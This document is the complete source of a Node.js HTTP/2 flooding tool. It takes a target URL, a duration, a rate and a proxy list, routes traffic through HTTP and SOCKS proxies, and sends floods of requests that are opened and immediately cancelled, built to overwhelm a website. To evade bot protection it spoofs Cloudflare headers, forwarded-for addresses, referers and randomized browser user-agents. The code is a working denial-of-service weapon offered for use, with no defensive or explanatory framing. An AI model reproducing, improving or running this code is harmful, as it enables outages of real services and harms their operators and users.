const errorHandler = error => {
	// console.log(error);
	return error;
};
process.on('uncaughtException', errorHandler);
process.on('unhandledRejection', errorHandler);
const crypto = require('crypto');
const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const fs = require('fs');
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const args = {
	url: process.argv[2],
	duration: process.argv[3] * 1000,
	rates: +process.argv[4],
	delay: +process.argv[5],
	proxies: process.argv[6]
};
const characters = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randInt = (min, max) => Math.floor(Math.random() * (max - min) + min);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(args.proxies);
const target = new URL(args.url);
target.path = target.pathname + target.search;
Array.prototype.delete = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
}
Array.prototype.shuffle = function () {
    for (let count = this.length - 1; count > 0; count--) {
        const index = randInt(0, count + 1);
        [this[count], this[index]] = [this[index], this[count]];
    }
    return this;
}
Object.prototype.shuffle = function () {
    const entries = Object.entries(this);
    for (let entry = entries.length - 1; entry > 0; entry--) {
        const index = randInt(0, entry + 1);
        [entries[entry], entries[index]] = [entries[index], entries[entry]];
    }
    return Object.fromEntries(entries);
}

let requestSettings = {};
let headers = [];
const cacheControls = [
	'max-age=0',
	'no-cache',
	'no-store',
	'no-transform',
	'only-if-cached',
];
const accepts = [
	'*/*',
	'image/avif,image/webp,*/*',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'application/json,text/plain,*/*',
	'text/css,*/*;q=0.1',
	'application/javascript,*/*;q=0.8',
	'application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'application/xml;q=0.1,text/html;q=0.9,octet-stream;q=0.7,image/png,image/*;q=0.8,*/*;q=0.5',
	'application/json,text/javascript,*/*;q=0.01',
	'application/json,text/javascript,*/*;q=0.8',
	'image/jpeg,image/gif,image/pjpeg,application/x-ms-application,application/xaml+xml,application/x-ms-xbap,*/*',
	'application/xml,application/xhtml+xml,text/html,text/plain,image/png,*/*;q=0.8',
	'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
	'image/png,image/*;q=0.8,*/*;q=0.5',
	'application/json,text/html;q=0.9,application/xhtml+xml;q=0.8',
	'image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel',
];
const encodings = ['gzip, deflate, br', 'gzip, deflate', 'gzip, br', 'deflate, br', 'gzip', 'deflate', 'br'];
const languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9', 'it-IT,it;q=0.9', 'pt-BR,pt;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'ko-KR,ko;q=0.9', 'ru-RU,ru;q=0.9', 'ar-SA,ar;q=0.9', 'hi-IN,hi;q=0.9', 'ur-PK,ur;q=0.9', 'tr-TR,tr;q=0.9', 'id-ID,id;q=0.9', 'nl-NL,nl;q=0.9', 'sv-SE,sv;q=0.9', 'no-NO,no;q=0.9', 'da-DK,da;q=0.9', 'fi-FI,fi;q=0.9', 'pl-PL,pl;q=0.9', 'cs-CZ,cs;q=0.9', 'hu-HU,hu;q=0.9', 'el-GR,el;q=0.9', 'pt-PT,pt;q=0.9', 'th-TH,th;q=0.9', 'vi-VN,vi;q=0.9', 'he-IL,he;q=0.9', 'fa-IR,fa;q=0.9', 'ur-IN,ur;q=0.9', 'ro-RO,ro;q=0.9', 'bg-BG,bg;q=0.9', 'hr-HR,hr;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sr-RS,sr;q=0.9', 'uk-UA,uk;q=0.9', 'et-EE,et;q=0.9', 'lv-LV,lv;q=0.9', 'lt-LT,lt;q=0.9', 'ms-MY,ms;q=0.9', 'fil-PH,fil;q=0.9', 'zh-TW,zh;q=0.9', 'es-AR,es;q=0.9', 'en', 'en,en-US;q=0.9', 'en,en-GB;q=0.9', 'en,fr-FR;q=0.9,fr;q=0.8', 'en,de;q=0.9', 'en,it;q=0.9,it-IT;q=0.8', 'en,fr-CA;q=0.9,fr;q=0.8', 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6', 'en,es;q=0.9,es-AR;q=0.8,es-MX;q=0.7', 'en,tr;q=0.9', 'en,ru;q=0.9', 'fr,en-gb;q=0.7,en;q=0.3', 'en-US;q=0.5,en;q=0.3', 'fr-CH,fr;q=0.9', 'en;q=0.8,de;q=0.7', 'de;q=0.7,*;q=0.5', 'en-US,en;q=0.5', 'es-mx,es,en', 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5', 'en-CA,en;q=0.9', 'en-AU,en;q=0.9', 'en-NZ,en;q=0.9', 'en-ZA,en;q=0.9', 'en-IE,en;q=0.9', 'en-IN,en;q=0.9', 'ca-ES,ca;q=0.9', 'cy-GB,cy;q=0.9', 'eu-ES,eu;q=0.9', 'gl-ES,gl;q=0.9', 'gu-IN,gu;q=0.9', 'kn-IN,kn;q=0.9', 'ml-IN,ml;q=0.9', 'mr-IN,mr;q=0.9', 'nb-NO,nb;q=0.9', 'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'zh-HK,zh;q=0.9', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8', 'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3'];
const metadata = {
	site: ['cross-site', 'same-site', 'same-origin', 'none'],
	mode: ['cors', 'no-cors', 'navigate', 'same-origin', 'websocket'],
	dest: ['document', 'empty', 'iframe', 'font', 'image', 'script'],
};
const referers = [
    target.origin,
    "https://www.google.com",
    "https://www.bing.com",
    "https://coccoc.com",
    "https://es.wikipedia.org",
    "https://en.wikipedia.org",
    "https://duckduckgo.com",
    "https://new.qq.com",
    "https://www.ecosia.org",
    "https://search.naver.com",
    "https://yandex.com",
    "https://www.baidu.com",
    "https://search.yahoo.com"
];
const contentTypes = ["text/html; charset=utf-8", "multipart/form-data", "text/plain", "application/x-www-form-urlencoded"];

const address = randIPv4();
const viaValues = [
	'1.0 squid (squid/5.2)',
	'1.1 ::ffff:' + address + ' (Mikrotik HttpProxy)',
	'1.1 ' + address + ' (Mikrotik HttpProxy)',
	'1.0 ' + address + ' (squid/4.7)',
];
const hash = crypto.createHash('md5').update(address).digest('hex');
const platformVersions = ['"6.2.0"', '"15.0.0"', '"13.4.0"', '"13.0.0"'];
const rateHeaders = {
	'CF-Visitor': '{"scheme":"https"}',
	'CDN-Loop': 'cloudflare',
	'CF-RAY': hash.substring(0, 16) + '-HKG',
	'CF-IPCountry': 'US',
	'dnt': '1',
	'x-forwarded-port': '443',
	'x-forwarded-protocol': 'https',
	'pragma': 'no-cache',
	'x-forwarded-host': target.host,
	'x-real-ip': '::ffff:' + address,
	'via': randList(viaValues),
	'cookie': hash.substring(16, 24) + '=' + hash.substring(24, 32),
	'sec-ch-ua-wow64': '?0',
	'sec-ch-ua-model': path('[rand]', 8).toUpperCase(),
	'sec-ch-ua-arch': 'x86',
	'sec-ch-ua-bitness': '64',
	'sec-ch-ua-full-version': '"118.0.5993.118"',
	'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.118", "Google Chrome";v="118.0.5993.118", "Not=A?Brand";v="99.0.0.0"',
	'sec-ch-ua-platform-version': randList(platformVersions)
};


const weightValues = [1, 220, 255, 256];

const versions = {
	APPLE: () => {
		const octets = [];
		for (let index = 0; index < 3; index++) {
			octets[0] = randInt(10, 20);
			octets[1] = randInt(0, 10);
			const lastDigit = randInt(0, 10);
			if (lastDigit !== 0) octets[2] = lastDigit;
		}
		return octets.join('_');
	},
	ANDROID: () => {
		const octets = [];
		octets[0] = randInt(5, 15);
		const secondaryDigit = randInt(0, 10);
		const lastDigit = randInt(0, 10);
		if (secondaryDigit !== 0) octets[1] = secondaryDigit;
		if (lastDigit !== 0) octets[2] = lastDigit;
		return octets.join('.');
	},
	ANDROID_DEVICE: () => {
		return path('[rand]', 2).toUpperCase() + '-' + randList(characters).toUpperCase() + randInt(100, 1000) + randList(characters).toUpperCase();
	},
	CHROME: () => {
		return Math.random() < 0.5 ? '118' + '.0.' + randInt(4000, 6000) + '.' + randInt(10, 200) : '118.0.0.0';
	},
	MOBILE_SAFARI: () => {
		const safariLastDigit = randInt(0, 20);
		const SAFARI = [];
		SAFARI[0] = randInt(500, 600);
		SAFARI[1] = '1';
		if (safariLastDigit !== 0) SAFARI[2] = safariLastDigit;
		return {
			MOBILE: randInt(10, 20) + randList(characters).toUpperCase() + randInt(10, 200),
			SAFARI: SAFARI.join('.')
		}
	}
};

function getUserAgent() {
	const systems = [
		'Windows NT 10.0; Win64; x64',
		'Windows NT 10.0; WOW64',
		'Windows NT 10.0',
		'X11; Linux x86_64',
		'Macintosh; Intel Mac OS X ' + versions.APPLE(),
		'iPhone; CPU iPhone OS ' + versions.APPLE() + ' like Mac OS X',
		'iPad; CPU OS ' + versions.APPLE() + ' like Mac OS X',
		'iPod; CPU iPhone OS ' + versions.APPLE() + ' like Mac OS X',
		'Linux; Android ' + versions.ANDROID() + '; ' + versions.ANDROID_DEVICE(),
		'Linux; Android ' + versions.ANDROID() + '; K'
	];
	const system = randList(systems);
	const mobileSafari = versions.MOBILE_SAFARI();
	const engine = system.includes('CPU') ? 'Mobile/' + mobileSafari.MOBILE + ' Safari/' + mobileSafari.SAFARI : 'Safari/' + mobileSafari.SAFARI;
	return 'Mozilla/5.0 (' + system + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + versions.CHROME() + ' ' + engine;
}
function randIPv4() {
    let address;
    do {
        const firstOctet = randInt(1, 224);
        if (
            firstOctet === 0 ||
            firstOctet === 10 ||
            firstOctet === 100 ||
            firstOctet === 127 ||
            firstOctet === 169 ||
            firstOctet === 172 ||
            firstOctet === 192 ||
            firstOctet === 198 ||
            firstOctet === 203
        ) {
            continue;
        }
        if (firstOctet >= 224 && firstOctet <= 239) {
            continue;
        }
        address = firstOctet + '.' + randInt(1, 256) + '.' + randInt(1, 256) + '.' + randInt(1, 256);
    } while (!address);
    return address;
}

function path(input, length) {
	let output = '';
	for (let index = 0; index < length; index++) {
		output += randList(characters);
	}
	return input.split('[rand]').join(output);
}

function randHeaders(length) {
    const keys = Object.keys(rateHeaders);
    const headers = [];
    for (let i = 0; i < length; i++) {
        const key = randList(keys);
        keys.delete(key);
        const headerEntry = {};
        if (Math.random() < 0.5) headerEntry[key] = rateHeaders[key];
        headers.push(headerEntry);
    }
    return headers;
}

function rotateHeaders() {
	const userAgent = getUserAgent();
	const platform = userAgent.includes('Windows') ? '"Windows"' : userAgent.includes('X11') ? '"Linux"' : userAgent.includes('Android') ? '"Android"' : userAgent.includes('Macintosh') ? '"macOS"' : userAgent.includes('like Mac OS X') ? '"iOS"' : '"Unknown"';
	const choosenHeaders = randHeaders(4);
	headers = {
		':method': 'GET',
		':authority': target.host,
		':scheme': 'https',
		':path': path(target.path, 8),
		...choosenHeaders[0],
		...choosenHeaders[1],
		'accept': randList(accepts),
		'accept-language': randList(languages),
		'accept-encoding': randList(encodings),
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
		'sec-ch-ua-platform': platform,
		'user-agent': userAgent,
		'sec-fetch-site': randList(metadata.site),
		'sec-fetch-mode': randList(metadata.mode),
		'sec-fetch-user': '?1',
		'sec-fetch-dest': randList(metadata.dest),
		'x-forwarded-for': randIPv4(),
		'x-forwarded-proto': 'https',
		'x-requested-with': 'XMLHttpRequest',
		'origin': randList(referers),
		'referer': randList(referers) + '/',
		'content-type': randList(contentTypes),
		'cache-control': randList(cacheControls),
		'if-modified-since': new Date().toUTCString(),
		'upgrade-insecure-requests': '1',
		'priority': 'u=0, i',
		...choosenHeaders[2],
		...choosenHeaders[3],
	};
	requestSettings = {
		parent: 0,
		exclusive: true,
		weight: randList(weightValues),
	};
}

function createSocket() {
	const socket = new net.Socket();
	socket.allowHalfOpen = true;
	socket.writable = true;
	socket.readable = true;
	socket.setNoDelay(true);
	socket.setKeepAlive(true, args.duration);
	return socket;
}

class Tunnel {
	HTTP(options) {
		const buffer = Buffer.from('CONNECT ' + options.address + ' HTTP/1.1\r\nHost: ' + options.address + '\r\n\r\n');
		const socket = createSocket();
		socket.connect(options.port, options.host);
		const timeout = setTimeout(socket => socket.destroy, options.timeout, socket);
		socket.once('connect', () => {
			clearTimeout(timeout);
			socket.write(buffer);
		});
		socket.once('data', data => {
			data.toString().indexOf('HTTP/1.1 200') === -1 ? socket.destroy() : options.handler(socket);
		});
		socket.once('error', errorHandler);
	}

	SOCKS4(options) {
		const address = options.address.split(':');
		const addrHost = address[0];
		const addrPort = +address[1];
		const requestBuffer = Buffer.alloc(10 + addrHost.length);
		requestBuffer[0] = 0x04;
		requestBuffer[1] = 0x01;
		requestBuffer[2] = addrPort >> 8;
		requestBuffer[3] = addrPort & 0xff;
		requestBuffer[4] = 0x00;
		requestBuffer[5] = 0x00;
		requestBuffer[6] = 0x00;
		requestBuffer[7] = 0x01;
		requestBuffer[8] = 0x00;
		Buffer.from(addrHost).copy(requestBuffer, 9, 0, addrHost.length);
		requestBuffer[requestBuffer.length - 1] = 0x00;
		const socket = createSocket();
		socket.connect(options.port, options.host);
		const timeout = setTimeout(socket => socket.destroy, options.timeout, socket);
		socket.once('connect', () => {
			clearTimeout(timeout);
			socket.write(requestBuffer);
		});
		socket.once('data', data => {
			data.length !== 8 || data[1] !== 0x5a ? socket.destroy() : options.handler();
		});
		socket.once('error', errorHandler);
	}

	SOCKS5(options) {
		const address = options.address.split(':');
		const addrHost = address[0];
		const addrPort = +address[1];
		const greeting = Buffer.from([0x05, 0x01, 0x00]);
		const buffer = Buffer.alloc(addrHost.length + 7);
		buffer[0] = 0x05;
		buffer[1] = 0x01;
		buffer[2] = 0x00;
		buffer[3] = 0x03;
		buffer[4] = addrHost.length;
		Buffer.from(addrHost).copy(buffer, 5, 0, addrHost.length);
		buffer[buffer.length - 2] = addrPort >> 8;
		buffer[buffer.length - 1] = addrPort & 0xff;
		const socket = createSocket();
		socket.connect(options.port, options.host);
		const timeout = setTimeout(socket => socket.destroy, options.timeout, socket);
		socket.once('connect', () => {
			clearTimeout(timeout);
			socket.write(greeting);
		});
		socket.once('data', data => {
			if (data.length !== 2 || data[0] !== 0x05 || data[1] !== 0x00) {
				socket.destroy();
				return;
			}
			socket.write(buffer);
			socket.once('data', data => {
				data[0] !== 0x05 || data[1] !== 0x00 ? socket.destroy() : options.handler(socket);
			});
		});
		socket.once('error', errorHandler);
	}
}
const tunnel = new Tunnel();
const protocols = {
	http: tunnel.HTTP,
	socks4: tunnel.SOCKS4,
	socks5: tunnel.SOCKS5,
};
function handler(socket) {
	const TLSOpts = {
		host: target.host,
		port: 443,
		honorCipherOrder: true,
		servername: target.host,
		ALPNProtocols: ['h2', 'http/1.1'],
		rejectUnauthorized: false,
		secureOptions:
			crypto.constants.SSL_OP_ALL |
			crypto.constants.SSL_OP_NO_SSLv2 |
			crypto.constants.SSL_OP_NO_SSLv3 |
			crypto.constants.SSL_OP_NO_TLSv1 |
			crypto.constants.SSL_OP_NO_TLSv1_1 |
			crypto.constants.SSL_OP_NO_COMPRESSION |
			crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
			crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
			crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
		socket,
		secureProtocol: 'TLS_method',
		ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
		sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
		ecdhCurve: 'x25519:secp256r1:secp384r1',
	};
	const tlsConn = tls.connect(443, target.host, TLSOpts, () => {
		const session = http2.connect(target.href, {
			settings: {
				headerTableSize: 65536,
				enablePush: false,
				initialWindowSize: 6291456,
				maxHeaderListSize: 262144,
			},
			createConnection: () => tlsConn,
		});
		session.once('connect', async () => {
			session.setLocalWindowSize(15728640);
			for (let index = 0; index < args.rates; index++) {
				const attackHandler = setInterval(() => {
					if (session.destroyed) {
						clearInterval(attackHandler);
						return;
					}
					const request = session.request(headers, requestSettings);
					request.pause();
					request.end();
					request.close();
					request.destroy();
				}, args.delay);
			}
		});
		session.once('error', errorHandler);
	});
	tlsConn.once('error', errorHandler);
	socket.once('error', errorHandler);
}
function prepareAttack() {
	const proxyURL = randList(proxies).split("://");
    const protocol = proxyURL[0];
    const proxy = proxyURL[1].split(":");
	const options = {
		host: proxy[0],
		port: +proxy[1],
		address: target.host + ':443',
		timeout: 5000,
		handler,
	};
	protocols[protocol](options);
}

rotateHeaders();
setTimeout(process.exit, args.duration);
setInterval(rotateHeaders, args.delay);
setInterval(prepareAttack, 0);